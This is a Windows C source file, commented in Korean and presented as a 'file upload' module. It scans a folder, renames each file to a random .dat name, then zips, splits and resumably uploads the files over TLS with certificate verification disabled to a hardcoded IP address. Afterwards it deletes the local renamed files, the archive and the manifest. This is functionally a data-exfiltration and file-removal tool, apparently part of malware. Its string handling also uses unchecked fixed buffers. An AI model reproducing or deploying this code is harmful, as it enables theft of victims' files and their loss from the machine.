﻿#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <io.h>

#include "miniz.h"
#include <wolfssl/ssl.h> // ★ WolfSSL 헤더 추가

#pragma comment(lib, "ws2_32.lib")
// ★ WolfSSL 정적 라이브러리를 링크 (빌드 환경에 맞춰 wolfssl.lib 또는 wolfssl_s.lib로 변경)
#pragma comment(lib, "wolfssl_s.lib") 

#define MAX_FILES       1024
#define MAX_PATH_LEN    260
#define PART_SIZE       (512 * 1024)   
#define SERVER_IP       "192.168.30.129"
#define SERVER_PORT     8000     // HTTPS는 보통 443 포트지만, 예시 포트 8000 사용

// WolfSSL 전역 컨텍스트와 세션 객체
static WOLFSSL_CTX* ssl_ctx = NULL;

typedef struct {
    char original[MAX_PATH_LEN];
    char obfuscated[MAX_PATH_LEN];
} FILE_MAP;

static FILE_MAP file_maps[MAX_FILES];
static int file_count = 0;

static char manifest_path[MAX_PATH_LEN];

int wolfssl_init_global_context() {
    // 1. WolfSSL 라이브러리 초기화
    if (wolfSSL_Init() != WOLFSSL_SUCCESS) {
        fprintf(stderr, "[ERROR] WolfSSL 라이브러리 초기화 실패.\n");
        return -1;
    }

    // 2. SSL/TLS 클라이언트 메서드 선택 (TLSv1.2 이상)
    // wolfTLSv1_2_client_method는 안정적인 TLSv1.2를 사용합니다.
    if ((ssl_ctx = wolfSSL_CTX_new(wolfTLSv1_2_client_method())) == NULL) {
        fprintf(stderr, "[ERROR] WolfSSL CTX 생성 실패.\n");
        wolfSSL_Cleanup();
        return -2;
    }

    // (선택 사항) 자체 서명/테스트 서버를 위해 인증서 검증을 건너뜁니다.
    // 실제 운영 환경에서는 신뢰할 수 있는 CA 인증서를 로드해야 합니다.
    wolfSSL_CTX_set_verify(ssl_ctx, WOLFSSL_VERIFY_NONE, 0);

    return 0;
}

// 프로그램 종료 시 한 번 호출
void wolfssl_cleanup_global_context() {
    if (ssl_ctx) {
        wolfSSL_CTX_free(ssl_ctx);
        ssl_ctx = NULL;
    }
    wolfSSL_Cleanup();
}




/* --------------------------------------------------------------
   🛰 공통 (HTTP)
---------------------------------------------------------------- */
/* --------------------------------------------------------------
   🛰 HTTPS 공통
---------------------------------------------------------------- */

// 반환값은 WOLFSSL 포인터입니다.
static WOLFSSL* https_connect_server() {
    WSADATA w;
    WSAStartup(MAKEWORD(2, 2), &w);

    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return NULL;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(SERVER_PORT);
    addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        closesocket(s);
        return NULL;
    }

    // ★ WolfSSL 객체 생성 및 Winsock 소켓에 바인딩
    WOLFSSL* ssl = wolfSSL_new(ssl_ctx);
    if (ssl == NULL) {
        closesocket(s);
        return NULL;
    }

    wolfSSL_set_fd(ssl, (int)s);

    // ★ TLS/SSL 핸드셰이크 실행
    if (wolfSSL_connect(ssl) != WOLFSSL_SUCCESS) {
        // wolfSSL_shutdown() 및 wolfSSL_free()가 소켓도 닫습니다.
        wolfSSL_free(ssl);
        return NULL;
    }

    // 핸드셰이크 성공, WOLFSSL 객체 반환
    return ssl;
}

// 기존 send_http_raw 함수를 HTTPS 버전으로 대체
static int send_https_raw(const char* header, const char* body)
{
    WOLFSSL* ssl = https_connect_server();
    if (ssl == NULL) return 0;

    // ★ wolfSSL_write 사용
    wolfSSL_write(ssl, header, strlen(header));

    if (body)
        wolfSSL_write(ssl, body, strlen(body));

    char resp[2048];
    // ★ wolfSSL_read 사용
    wolfSSL_read(ssl, resp, sizeof(resp) - 1);

    // ★ WolfSSL 객체 해제. 내부적으로 소켓도 닫힙니다.
    wolfSSL_free(ssl);
    return 1;
}



static char* basename_nopath(const char* path) {
    const char* p = strrchr(path, '\\');
    return p ? (char*)(p + 1) : (char*)path;
}

/* --------------------------------------------------------------
   📌 업로드 대상 목록 manifest 저장/로드
---------------------------------------------------------------- */
static int save_manifest()
{
    FILE* fp = fopen(manifest_path, "w");
    if (!fp) return 0;

    fprintf(fp, "{\n  \"count\": %d,\n  \"files\": [\n", file_count);

    for (int i = 0; i < file_count; i++) {
        fprintf(fp,
            "    {\"original\": \"%s\", \"obfuscated\": \"%s\"}%s\n",
            file_maps[i].original,
            file_maps[i].obfuscated,
            (i == file_count - 1 ? "" : ",")
        );
    }

    fprintf(fp, "  ]\n}\n");
    fclose(fp);
    return 1;
}

static int load_manifest()
{
    if (_access(manifest_path, 0) != 0)
        return 0;

    FILE* fp = fopen(manifest_path, "r");
    if (!fp) return 0;

    char buf[8192];
    fread(buf, 1, sizeof(buf), fp);
    fclose(fp);

    char* p = strstr(buf, "\"count\"");
    if (!p) return 0;

    file_count = atoi(strchr(p, ':') + 1);
    if (file_count <= 0 || file_count > MAX_FILES) return 0;

    p = strstr(buf, "\"files\"");
    if (!p) return 0;

    char* q = strchr(p, '[');
    if (!q) return 0;
    q++;

    for (int i = 0; i < file_count; i++) {
        char* o = strstr(q, "\"original\"");
        char* b = strstr(q, "\"obfuscated\"");
        if (!o || !b) return 0;

        sscanf(strchr(o, ':') + 1, " \"%[^\"]\"", file_maps[i].original);
        sscanf(strchr(b, ':') + 1, " \"%[^\"]\"", file_maps[i].obfuscated);

        q = b + 20;
    }

    return 1;
}

/* --------------------------------------------------------------
   🧩 파일 스캔 & 난독화
---------------------------------------------------------------- */
static void scan_and_obfuscate(const char* folder)
{
    WIN32_FIND_DATAA fd;
    char search[MAX_PATH_LEN];
    sprintf(search, "%s\\*.*", folder);

    HANDLE h = FindFirstFileA(search, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    srand((unsigned)time(NULL));

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;

        char oldpath[MAX_PATH_LEN];
        sprintf(oldpath, "%s\\%s", folder, fd.cFileName);

        char newname[MAX_PATH_LEN];
        sprintf(newname, "%u_%u.dat", rand(), rand());

        char newpath[MAX_PATH_LEN];
        sprintf(newpath, "%s\\%s", folder, newname);

        MoveFileA(oldpath, newpath);

        strcpy(file_maps[file_count].original, fd.cFileName);
        strcpy(file_maps[file_count].obfuscated, newname);
        file_count++;

    } while (FindNextFileA(h, &fd));

    FindClose(h);
}

/* --------------------------------------------------------------
   🗜 ZIP 생성 (오류 검사 강화)
---------------------------------------------------------------- */
static int make_zip(const char* folder, const char* zipname)
{
    mz_zip_archive zip;
    memset(&zip, 0, sizeof(zip));

    if (!mz_zip_writer_init_file(&zip, zipname, 0))
        return 0;

    for (int i = 0; i < file_count; i++) {
        char full[MAX_PATH_LEN];
        sprintf(full, "%s\\%s", folder, file_maps[i].obfuscated);

        int ok = 0;
        for (int retry = 0; retry < 5; retry++) {

            ok = mz_zip_writer_add_file(
                &zip,
                file_maps[i].obfuscated,
                full,
                NULL, 0,
                MZ_BEST_COMPRESSION
            );

            if (ok)
                break;

            Sleep(150); // 파일 잠금 해제 기다림
        }

        if (!ok) {
            printf("[ERROR] ZIP 파일 추가 실패: %s\n", full);
            mz_zip_writer_end(&zip);
            return 0;
        }
    }

    mz_zip_writer_finalize_archive(&zip);
    mz_zip_writer_end(&zip);
    return 1;
}


/* --------------------------------------------------------------
   📑 ZIP 분할
---------------------------------------------------------------- */
static int split_zip(const char* zipname, int part_size)
{
    FILE* fp = fopen(zipname, "rb");
    if (!fp) return -1;

    unsigned char* buf = malloc(part_size);
    int idx = 0;

    while (1) {
        size_t r = fread(buf, 1, part_size, fp);
        if (r == 0) break;

        char out[MAX_PATH_LEN];
        sprintf(out, "%s.part%d", zipname, idx);

        FILE* outfp = fopen(out, "wb");
        fwrite(buf, 1, r, outfp);
        fclose(outfp);

        idx++;
    }

    free(buf);
    fclose(fp);
    return idx;
}

/* --------------------------------------------------------------
   🔁 이어받기
---------------------------------------------------------------- */
static long server_check_part(const char* filename)
{
    WOLFSSL* ssl = https_connect_server();
    if (ssl == NULL) return 0;

    char req[512];
    sprintf(req,
        "GET /api/check_part?filename=%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
        filename, SERVER_IP
    );

    wolfSSL_write(ssl, req, strlen(req));

    char resp[1024];
    // ★ wolfSSL_read를 사용하여 응답 수신
    int len = wolfSSL_read(ssl, resp, 1023);
    wolfSSL_free(ssl); // 소켓 해제

    if (len <= 0) return 0;
    resp[len] = 0;

    char* p = strstr(resp, "\"uploaded_size\":");
    return p ? atol(p + strlen("\"uploaded_size\":")) : 0;
}

static int upload_part_resume(const char* filepath)
{
    char* fname = basename_nopath(filepath);
    long offset = server_check_part(fname);

    FILE* fp = fopen(filepath, "rb");
    if (!fp) return 0;

    fseek(fp, 0, SEEK_END);
    long total = ftell(fp);
    fseek(fp, offset, SEEK_SET);

    long remain = total - offset;

    char* buf = malloc(remain);
    fread(buf, 1, remain, fp);
    fclose(fp);

    WOLFSSL* ssl = https_connect_server();
    if (ssl == NULL) {
        free(buf);
        return 0;
    }

    char header[512];
    sprintf(header,
        "POST /api/upload_part HTTP/1.1\r\nHost: %s\r\nContent-Length: %ld\r\n"
        "X-Filename: %s\r\nX-Offset: %ld\r\nConnection: close\r\n\r\n",
        SERVER_IP, remain, fname, offset
    );

    // ★ wolfSSL_write 사용
    wolfSSL_write(ssl, header, strlen(header));
    wolfSSL_write(ssl, buf, remain);

    free(buf);

    // 응답을 받기 위해 wolfSSL_read 호출 (응답 확인이 필요하다면 여기서 처리)
    char resp_buf[1024];
    wolfSSL_read(ssl, resp_buf, sizeof(resp_buf) - 1);

    // ★ wolfSSL_free 사용 (closesocket 대체)
    wolfSSL_free(ssl);
    return 1;
}

/* --------------------------------------------------------------
   🧾 mapping.json 전송
---------------------------------------------------------------- */
static int send_mapping_json()
{
    char json[4096] = "{";

    for (int i = 0; i < file_count; i++) {
        char line[512];
        sprintf(line,
            "\"%s\":\"%s\"%s",
            file_maps[i].obfuscated,
            file_maps[i].original,
            (i == file_count - 1 ? "" : ",")
        );
        strcat(json, line);
    }

    strcat(json, "}");

    char header[512];
    sprintf(header,
        "POST /api/mapping HTTP/1.1\r\nHost: %s\r\nContent-Length: %zu\r\nConnection: close\r\n\r\n",
        SERVER_IP, strlen(json)
    );

    return send_https_raw(header, json);
}

/* --------------------------------------------------------------
   🏁 finish_upload 호출
---------------------------------------------------------------- */
static int finish_upload_request(const char* zip_basename, int part_count)
{
    char body[256];
    sprintf(body, "zip_name=%s&part_count=%d", zip_basename, part_count);

    char header[512];
    sprintf(header,
        "POST /api/finish_upload HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %zu\r\nConnection: close\r\n\r\n",
        SERVER_IP, strlen(body)
    );

    return send_https_raw(header, body);
}

/* --------------------------------------------------------------
   🧹 Cleanup
---------------------------------------------------------------- */
static void delete_local_file(const char* path)
{
    if (_access(path, 0) == 0)
        remove(path);
}

static void delete_obfuscated_files(const char* folder)
{
    char full[MAX_PATH_LEN];
    for (int i = 0; i < file_count; i++) {
        sprintf(full, "%s\\%s", folder, file_maps[i].obfuscated);
        delete_local_file(full);
    }
}

static void delete_zip_and_parts(const char* folder, const char* zipname, int total_parts)
{
    char full[MAX_PATH_LEN];
    sprintf(full, "%s\\%s", folder, zipname);
    delete_local_file(full);

    for (int i = 0; i < total_parts; i++) {
        sprintf(full, "%s\\%s.part%d", folder, zipname, i);
        delete_local_file(full);
    }
}

/* --------------------------------------------------------------
   🚀 전체 업로드
---------------------------------------------------------------- */
int run_file_upload(const char* folder)
{
    if (wolfssl_init_global_context() != 0) {
        return 1;
    }/////?
    sprintf(manifest_path, "%s\\upload_manifest.json", folder);

    printf("[UPLOAD] 시작\n");

    if (load_manifest()) {
        printf("[RESUME] manifest 로드 → 이어받기 모드\n");
    }
    else {
        printf("[SCAN] 폴더 스캔+난독화\n");
        scan_and_obfuscate(folder);

        printf("[SAVE] manifest 저장\n");
        save_manifest();
    }

    char zip_path[MAX_PATH_LEN];
    sprintf(zip_path, "%s\\upload.zip", folder);

    printf("[ZIP] ZIP 생성\n");
    if (!make_zip(folder, zip_path)) {
        printf("[ERROR] ZIP 생성 실패 → 업로드 중단\n");
        return 0;
    }

    printf("[SPLIT] ZIP 분할\n");
    int parts = split_zip(zip_path, PART_SIZE);

    printf("[UPLOAD] part 업로드\n");
    for (int i = 0; i < parts; i++) {
        char partpath[MAX_PATH_LEN];
        sprintf(partpath, "%s.part%d", zip_path, i);
        upload_part_resume(partpath);
    }

    printf("[UPLOAD] mapping.json 전송\n");
    send_mapping_json();

    printf("[SERVER] finish_upload 호출\n");
    finish_upload_request(basename_nopath(zip_path), parts);

    printf("[CLEANUP] 임시파일 삭제\n");
    delete_obfuscated_files(folder);
    delete_zip_and_parts(folder, "upload.zip", parts);
    delete_local_file(manifest_path);

    printf("[DONE] 업로드 완료\n");
    wolfssl_cleanup_global_context();
    return 1;
}
